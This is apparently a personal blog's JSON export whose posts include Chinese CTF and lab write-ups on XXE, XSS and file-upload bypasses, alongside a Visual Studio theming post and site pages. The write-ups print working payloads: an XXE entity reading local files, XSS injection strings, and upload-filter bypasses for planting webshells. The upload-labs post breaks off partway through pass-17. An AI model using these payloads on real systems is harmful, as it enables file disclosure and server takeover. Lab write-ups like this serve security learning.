{"meta":{"title":"s1rius's blog","subtitle":null,"description":null,"author":"s1rius","url":""},"pages":[{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2021-11-09T14:13:18.000Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"donate","date":"2022-12-20T15:13:05.000Z","updated":"2022-08-29T05:14:43.425Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[さくら荘のhojun] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2021-11-09T14:13:18.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2021-11-09T14:13:18.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"links","date":"2022-08-27T16:00:00.000Z","updated":"2022-08-28T11:09:35.226Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2022-08-28T09:55:45.716Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"}],"posts":[{"title":"Visual Studio 2022界面美化教程","slug":"Visual Studio 2022界面美化教程","date":"2022-08-29T11:23:58.841Z","updated":"2022-08-30T10:17:38.167Z","comments":true,"path":"2022/08/Visual Studio 2022界面美化教程/","link":"","permalink":"/2022/08/Visual Studio 2022界面美化教程/","excerpt":"","text":"点击并拖拽以移动 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。 这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章） 不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。 但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。 第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。 新建项目 C#里面最后一项 点击并拖拽以移动 点击并拖拽以移动 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme 然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了 点击并拖拽以移动 这个插件是为后面设置背景图片准备 第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。 点击并拖拽以移动 背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些 点击并拖拽以移动 ​","categories":[{"name":"资源","slug":"资源","permalink":"/categories/资源/"}],"tags":[{"name":"visual studio 2022","slug":"visual-studio-2022","permalink":"/tags/visual-studio-2022/"}],"keywords":[{"name":"资源","slug":"资源","permalink":"/categories/资源/"}]},{"title":"xxe","slug":"XXE","date":"2022-08-29T10:18:54.839Z","updated":"2022-08-30T10:24:25.671Z","comments":true,"path":"2022/08/XXE/","link":"","permalink":"/2022/08/XXE/","excerpt":"","text":"XXE发现输入的username被alert了查源码 1onclick=\"XMLFunction()\" 抓包看xml格式回来看控制台发现js的xml应用123456789101112131415161718192021&lt;script type=\"text/javascript\"&gt; function XMLFunction()&#123; var xml = '' + '&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;' + '&lt;root&gt;' + ' &lt;username&gt;' + $('#username').val() + '&lt;/username&gt;' + ' &lt;password&gt;' + $('#password').val() + '&lt;/password&gt;' + ' &lt;/root&gt;'; var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () &#123; if(xmlhttp.readyState == 4)&#123; console.log(xmlhttp.readyState); console.log(xmlhttp.responseText); alert(xmlhttp.responseText); &#125; &#125; xmlhttp.open(\"POST\",\"login.php\",true); xmlhttp.send(xml); &#125;; &lt;/script&gt; 构造xxe攻击这是post包==传的时候记得把注释删去==12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[&lt;!ENTITY flag SYSTEM \"file:///flag\"&gt;&lt;!--构造实体--&gt;]&gt;&lt;root&gt;&lt;username&gt;&amp;flag;&lt;/username&gt;&lt;!--输出flag实体--&gt;&lt;password&gt;2333&lt;/password&gt;&lt;/root&gt; flag{6866a844-3788-4a9d-9909-1d9d9943f56f} 123456789101112131415161718192021222324252627282930313233&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = 'admin'; //账号$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",1,$username); &#125;else&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",0,$username); &#125; &#125;catch(Exception $e)&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,$e-&gt;getMessage());&#125;header('Content-Type: text/html; charset=utf-8');echo $result;?&gt; 有admin密码了也没用藏内网了，上次比赛ssrf题出过 etc/hosts proc/net/arp","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"xxe","slug":"xxe","permalink":"/tags/xxe/"},{"name":"buuctf","slug":"buuctf","permalink":"/tags/buuctf/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"xss-lab","slug":"xsslab","date":"2022-08-29T10:18:54.837Z","updated":"2022-08-30T10:23:23.688Z","comments":true,"path":"2022/08/xsslab/","link":"","permalink":"/2022/08/xsslab/","excerpt":"","text":"level 1没啥好说的直接alert level 212345&lt;input name=keyword value=\"test\"&gt;//改后是&lt;input name=keyword value=\"1111\"&gt;&lt;script&gt;……&gt;//1111\"&gt;&lt;script&gt;……这是输入的部分前后闭合 level 3用了htmlspeialchars()函数 &lt;&gt;”都被过滤二者都写可以 level 4和上面一样 level 5on 和 script都被过滤这里用javascript:伪协议出来的链接就是答案 level 6可以大小写绕过 level 7把特殊字符便空了可以双写绕过 level 8这关卡的死死的要编码绕过 level 9strpos函数看是否有http://验证是否为安全连接但是没有限定位置要编码下还要把http://放最后面用//注释掉 level 10-13页面没有注入点看源代码发现隐藏的表单要改为文本框text1type=\"text\" onclick=\"alert(1)\" 后面几关都要改t_sort因为后端获取t_sort和user-agent等要从相应注入点注入 level 14 exif xss漏洞，exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。 喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数甚至有些照片能看到经纬度这关要用到exifviewer网页但是 level 15level 16对script、/、空格进行了转换空格不可以就用换行符1&lt;a%0atype=\"text\"%0a\"alert\"&gt; level 17-18火狐不支持swf格式把链接加网页上显示出这样很奇怪开始整套娃了 要找个支持flash的浏览器才能正常打开17-20关都能用flash xssflash xss原理但这里先用别的办法以18关为例注入点可以在arg02但是你连swf都没有哪来的moouseover哪所以得url连接一下1http://127.0.0.1/xss-labs/level18.php/xsf02.swf?a=?arg01=a&amp;arg02=%20onmouseover=javascript:alert(1) level 19-20Flash XSS漏洞快速上手flash xss原理flash反编译工具以下是大佬的payload 卑微小杨在线emoflash反编译也不懂等有空了再研究吧好多困难等着被克服那这次没支持flash的浏览器真没法做 18关1http://10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=\"javascript:alert(/bmfx/)\"&gt;bmfx&lt;/a&gt; 19关1http://10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\\\"))&#125;catch(e)&#123;alert(/bmfx/)&#125;//%26width=998%26height=998","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"xss","slug":"xss","permalink":"/tags/xss/"},{"name":"xss-lab","slug":"xss-lab","permalink":"/tags/xss-lab/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"upload-labs","slug":"upload-labs","date":"2022-08-29T10:18:54.835Z","updated":"2022-08-30T10:23:01.599Z","comments":true,"path":"2022/08/upload-labs/","link":"","permalink":"/2022/08/upload-labs/","excerpt":"","text":"pass-01前端js过滤 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 最简单的 burp抓包改后缀 pass-0212345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 用if函数结合$_FILES[&#39;myfile&#39;][&#39;type&#39;]判断MIME类型 后端改content-type 将application/octect-stream变为image/jpeg、image/png或image/gif pass-03123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 他经过了许多步 但其实他只匹配了$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); 修改为php1，php2，php3，php4，php5，phtml等 与php解析相同的后缀皆可 pass-04123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这回匹配的倒挺多 不过配置文件没过滤 上传.htaccess文件 写入下面两句中的一句即可 第一句是全按php解析 第二句是将jpg按php解析 12SetHandler application/x-httpd-phpAddType application/x-https-php .jpg pass-05和第4关类似 写入.user.ini文件 1auto_prepend_file=shell.jpg 再配合shell pass-06这一关源码补上了之前漏网的配置文件 但是这里可以使用大小写绕过 例如.Php pass-07这里补了一句 1$file_ext = strtolower($file_ext); //转换为小写 没法大小写绕过了 这里通过补空格来绕过 .php (空格) pass-08这里补了句首位去空 1$file_ext = trim($file_ext); //首尾去空 这次用 . 绕过 .php. 和上面一样 后面的空格和 . 会被服务器自动删除 pass-09这里补了 1$file_name = deldot($file_name);//删除文件名末尾的点 比之前少了一句 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 使用 1.php::$DATA pass-10这里补回了::$DATA仔细看这里过滤的顺序 1234567$deny_ext=array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");$file_name = trim($_FILES['upload_file']['name']);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 仔细看这里过滤的顺序 先去的点然后去的空 于是可以 .php. . 过滤后剩下 .php. pass-1112345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这里用trim函数删去通过$_FILES[&#39;upload_ext&#39;][&#39;tmp_name&#39;]得到的浏览器通过报文传过来的在burpsuite中的变量名是filename的字符串左右两边的空格 这就省了几步过滤 但是下面这句 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 是匹配到黑名单后替换成空 于是这里可以双写绕过 .pphphp pass-12这次使用了白名单过滤 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 讲一下00截断的原理，在服务器读到十六进制编码为00时就会停止读取，而save_path是通过GET传参的00的GET传参的数据最终都会经过URL解码而%00解码之后就是十六进制对应的00，这就导致move_uploaded_file函数会读到00就结束从而上传成功 .php%00 pass-13代码和十二关一样，只是save_path改用POST传参了 burpsuite自带的16进制编辑器改16进制 找到文件名后缀后面的0被改为00 pass-141234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\");//以只读 二进制方式打开 $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin);//从二进制字符串对数据进行解包 //'C2char'的意思是二进制文件类型是'unsigned char'转换为char类型最终返回值是一个数组。之后将数组返还给$strinfo函数。 $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);//将$strinfo中的每一个元素转变为int型并且拼接输出给 $typeCode $fileType = ''; switch($typeCode)&#123;//switch匹配 case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 这里本质上是检验的文件头 只要做个文件头正确的图片🐎即可 pass-151234567891011121314function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename);//获取文件信息 $ext = image_type_to_extension($info[2]);//返回文件后缀 if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 这里上传图片🐎即可 pass-161$image_type = exif_imagetype($filename); 这里的函数替代15关的 12$info = getimagesize($filename);//获取文件信息$ext = image_type_to_extension($info[2]);//返回文件后缀 还是图片🐎即可 pass-17123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; 